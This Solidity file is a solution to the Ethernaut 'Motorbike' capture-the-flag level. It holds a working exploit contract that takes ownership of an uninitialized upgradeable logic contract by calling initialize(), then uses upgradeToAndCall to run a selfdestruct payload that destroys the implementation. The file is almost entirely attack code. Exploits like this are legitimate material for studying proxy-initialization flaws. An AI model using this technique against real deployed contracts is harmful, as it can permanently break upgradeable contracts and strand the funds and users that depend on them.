// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

contract DestroyEngine {
    function destroy() external {
        selfdestruct(payable(tx.origin));
    }
}

contract MotorbikeExploit {
    IEngine public implementation;
    DestroyEngine public destroyer;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of `Engine` (logic) contract in `Motorbike` challenge.
    /// can be gotten by `getStorageAt()` _IMPLEMENTATION_SLOT of `Motorbike` contract.
    /// Note: https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A
    constructor(IEngine _implementation) {
        implementation = _implementation;
        destroyer = new DestroyEngine();
    }

    /// @notice Initializes the `Engine` contract and upgrades it to a malicious contract
    function exploit() external payable {
        implementation.initialize();
        implementation.upgradeToAndCall{value: msg.value}(
            address(destroyer),
            abi.encodeWithSelector(DestroyEngine.destroy.selector)
        );
    }
}
